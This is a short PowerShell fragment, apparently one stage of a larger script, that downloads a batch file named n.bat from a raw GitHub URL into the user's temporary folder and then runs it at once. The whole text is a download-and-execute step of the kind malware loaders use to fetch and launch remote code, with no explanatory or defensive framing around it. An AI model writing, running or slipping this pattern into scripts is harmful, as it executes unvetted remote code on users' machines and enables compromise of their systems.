$url4 = "https://raw.githubusercontent.com/cia168168/folder/main/n.bat"
$output4 = "$env:TEMP\n.bat"
Invoke-WebRequest -Uri $url4 -OutFile $output4
& $output4
